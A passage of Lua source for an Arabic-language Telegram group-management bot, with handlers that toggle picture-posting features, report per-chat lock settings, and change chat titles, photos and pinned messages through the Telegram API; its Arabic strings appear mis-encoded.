https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ุงููู" and Manager(msg) and ChCheck(msg) or text == "ุชูุนูู ุงูุงููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ุงููู" and Manager(msg) and ChCheck(msg) or text == "ุชุนุทูู ุงูุงููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "ุงููู" or text == "โข ุงููู โ") and not DevRio:get(Rinda..'Rio:Anime:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(3,1002); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุตูุฑุฉ ุงูุงููู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/anime:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงููุงู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ููู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงููุงู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "ููู" or text == "โข ููู โ") and not DevRio:get(Rinda..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(45,125); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูููู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/Movies:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชูุนูู ูุณูุณู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงููุณูุณูุงุช'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "ุชุนุทูู ูุณูุณู" and Manager(msg) and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงููุณูุณูุงุช'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "ูุณูุณู" or text == "โข ูุณูุณู โ") and not DevRio:get(Rinda..'Rio:Series:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,54); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงููุณูุณู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/series:"..msg.sender_user_id_}},{{text = 'โข Rinda Team โข',url="t.me/Source_Rinda"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if DevRio:get(Rinda..'Rio:LockSettings'..msg.chat_id_) then 
if text == "ุงูุฑูุงุจุท" then if DevRio:get(Rinda..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'ููููู' else mute_links = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุฑูุงุจุท โข "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงููุนุฑู" or text == "ุงููุนุฑูุงุช" then if DevRio:get(Rinda..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'ูููููู' else lock_tag = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงููุนุฑู โข "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงููุชุญุฑูู" or text == "ุงูููุตูุงุช ุงููุชุญุฑูู" then if DevRio:get(Rinda..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'ูููููู' else mute_gifs = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงููุชุญุฑูู โข "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูููุตูุงุช" then if DevRio:get(Rinda..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'ูููููู' else lock_sticker = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูููุตูุงุช โข "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุตูุฑ" then if DevRio:get(Rinda..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'ูููููู' else mute_photo = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุตูุฑ โข "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูููุฏูู" or text == "ุงูููุฏูููุงุช" then if DevRio:get(Rinda..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'ูููููู' else mute_video = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูููุฏูู โข "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุงูููุงูู" then if DevRio:get(Rinda..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'ูููู' else mute_in = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงูุงูููุงูู โข "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุฏุฑุฏุดู" then if DevRio:get(Rinda..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'ููููู' else mute_text = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุฏุฑุฏุดู โข "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุชูุฌูู" or text == "ุงุนุงุฏู ุงูุชูุฌูู" then if DevRio:get(Rinda..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'ูููู' else lock_forward = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงูุชูุฌูู โข "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุงุบุงูู" then if DevRio:get(Rinda..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'ูููููู' else mute_music = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุงุบุงูู โข "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุตูุช" or text == "ุงูุตูุชูุงุช" then if DevRio:get(Rinda..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'ููููู' else mute_voice = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงูุตูุช โข "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุฌูุงุช" or text == "ุฌูุงุช ุงูุงุชุตุงู" then if DevRio:get(Rinda..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'ูููููู' else lock_contact = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุฌูุงุช โข "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงููุงุฑูุฏุงูู" then if DevRio:get(Rinda..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'ูููู' else markdown = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงููุงุฑูุฏุงูู โข "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงููุงุดุชุงู" then if DevRio:get(Rinda..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'ูููู' else lock_htag = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงููุงุดุชุงู โข "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุชุนุฏูู" then if DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'ูููู' else mute_edit = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงูุชุนุฏูู โข "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุชุซุจูุช" then if DevRio:get(Rinda..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'ูููู' else lock_pin = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงูุชุซุจูุช โข "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุงุดุนุงุฑุงุช" then if DevRio:get(Rinda..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'ูููููู' else lock_tgservice = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุงุดุนุงุฑุงุช โข "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูููุงูุด" then if DevRio:get(Rinda..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'ูููููู' else lock_spam = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูููุงูุด โข "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุฏุฎูู" then if DevRio:get(Rinda..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'ููููู' else lock_Join = 'ููุชูุญ' end local RindaTeam = "\n" .."โ๏ธฐุงูุฏุฎูู โข "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุดุจูุงุช" then if DevRio:get(Rinda..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'ูููููู' else lock_wp = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุดุจูุงุช โข "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูููุงูุน" then if DevRio:get(Rinda..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'ูููููู' else lock_location = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูููุงูุน โข "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุนุฑุจูู" then if DevRio:get(Rinda..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'ูููููู' else lock_arabic = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุนุฑุจูู โข "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุงููููุฒูู" then if DevRio:get(Rinda..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'ูููููู' else lock_english = 'ููุชูุญู' end local RindaTeam = "\n" .."โ๏ธฐุงูุงููููุฒูู โข "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูููุฑ" then if DevRio:get(Rinda..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'ููุชูุญ' else lock_kaf = 'ูููู' end local RindaTeam = "\n" .."โ๏ธฐุงูููุฑ โข "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงููุดุงุฑ" then if DevRio:get(Rinda..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'ููุชูุญ' else lock_fshar = 'ูููู' end local RindaTeam = "\n" .."โ๏ธฐุงููุดุงุฑ โข "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
if text == "ุงูุทุงุฆููู" then if DevRio:get(Rinda..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'ููุชูุญู' else lock_taf = 'ููููู' end local RindaTeam = "\n" .."โ๏ธฐุงูุทุงุฆููู โข "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, RindaTeam, 1, 'md') end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชูุนูู ูุดู ุงูุงุนุฏุงุฏุงุช' and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ูุดู ุงูุงุนุฏุงุฏุงุช'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'ุชุนุทูู ูุดู ุงูุงุนุฏุงุฏุงุช' and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ูุดู ุงูุงุนุฏุงุฏุงุช'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:LockSettings'..msg.chat_id_) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == 'ุชุนุทูู ุงูุชุญูู' or text == 'ููู ุงูุชุญูู' or text == 'ุชุนุทูู ุชูุจูู ุงูุฏุฎูู') and Manager(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุชุญูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'ุชูุนูู ุงูุชุญูู' or text == 'ูุชุญ ุงูุชุญูู' or text == 'ุชูุนูู ุชูุจูู ุงูุฏุฎูู') and Manager(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุชุญูู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชูุนูู ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุฑุฏูุฏ ุงููุฏูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'ุชุนุทูู ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุฑุฏูุฏ ุงููุฏูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุชูุนูู ุฑุฏูุฏ ุงููุทูุฑ' and Manager(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุฑุฏูุฏ ุงููุทูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'ุชุนุทูู ุฑุฏูุฏ ุงููุทูุฑ' and Manager(msg) and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุฑุฏูุฏ ุงููุทูุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if RioSudo(msg) then
if text == 'ุชูุนูู ุงููุบุงุฏุฑู' or text == 'โข ุชูุนูู ุงููุบุงุฏุฑู โ' and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงููุบุงุฏุฑู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Left:Bot"..Rinda)
end
if text == 'ุชุนุทูู ุงููุบุงุฏุฑู' or text == 'โข ุชุนุทูู ุงููุบุงุฏุฑู โ' and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงููุบุงุฏุฑู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Left:Bot"..Rinda,true) 
end 
if text == 'ุชูุนูู ุงูุงุฐุงุนู' or text == 'โข ุชูุนูู ุงูุงุฐุงุนู โ' and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงุฐุงุนู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Send:Bot"..Rinda)
end
if text == 'ุชุนุทูู ุงูุงุฐุงุนู' or text == 'โข ุชุนุทูู ุงูุงุฐุงุนู โ' and ChCheck(msg) then 
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงุฐุงุนู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Send:Bot"..Rinda,true) 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุถุน ุงุณู (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ุถุน ุงุณู) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"โ๏ธฐุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุชุบูุฑ ูุนูููุงุช ุงููุฌููุนู ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช")  
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุชุบูุฑ ุงุณู ุงููุฌููุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.content_.photo_ then
if DevRio:get(Rinda..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"โ๏ธฐุนุฐุฑุง ุงูุจูุช ููุณ ุงุฏูู ูุฑุฌู ุชุฑููุชู ูุงููุญุงููู ูุงุญูุง") 
DevRio:del(Rinda..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุชุบูุฑ ูุนูููุงุช ุงููุฌููุนู ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช") 
DevRio:del(Rinda..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุชุบูุฑ ุตูุฑุฉ ุงููุฌููุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
end,nil) 
DevRio:del(Rinda..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ุถุน ุตูุฑู$") and ChCheck(msg) or text and text:match("^ูุถุน ุตูุฑู$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_,msg.id_, 1, 'โ๏ธฐุงุฑุณู ุตูุฑุฉ ุงููุฌููุนู ุงูุงู', 1, 'md')
DevRio:set(Rinda..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุญุฐู ุงูุตูุฑู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงูุตูุฑู$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุตูุฑุฉ ุงููุฌููุนู")  
return false  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text and text:match("^ุงูุบุงุก ุชุซุจูุช$") and ChCheck(msg) or text and text:match("^ุงูุบุงุก ุงูุชุซุจูุช$") and ChCheck(msg) then
if DevRio:sismember(Rinda.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Rio(msg.chat_id_,msg.id_, 1, "โ๏ธฐุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevRio:del(Rinda..'Rio:PinnedMsg'..msg.chat_id_)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุงูุบุงุก ุชุซุจูุช ุงูุฑุณุงูู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"โ๏ธฐุงูุง ูุณุช ุงุฏูู ููุง ูุฑุฌู ุชุฑููุชู ุงุฏูู ุซู ุงุนุฏ ุงููุญุงููู")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงูุชุซุจูุช ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช")  
return false  
end
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุงูุบุงุก ุชุซุจูุช ุงููู$") and ChCheck(msg) then  
if DevRio:sismember(Rinda.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Rio(msg.chat_id_,msg.id_, 1, "โ๏ธฐุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุงูุบุงุก ุชุซุจูุช ุงููู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevRio:del(Rinda.."Rio:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"โ๏ธฐุงูุง ูุณุช ุงุฏูู ููุง ูุฑุฌู ุชุฑููุชู ุงุฏูู ุซู ุงุนุฏ ุงููุญุงููู")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงูุชุซุจูุช ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช")  
return false  
end
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุงุนุงุฏู ุชุซุจูุช$") and ChCheck(msg) or text and text:match("^ุงุนุงุฏู ุงูุชุซุจูุช$") and ChCheck(msg) or text and text:match("^ุงุนุงุฏุฉ ุงูุชุซุจูุช$") and ChCheck(msg) then
if DevRio:sismember(Rinda.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Rio(msg.chat_id_,msg.id_, 1, "โ๏ธฐุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
local PinId = DevRio:get(Rinda..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
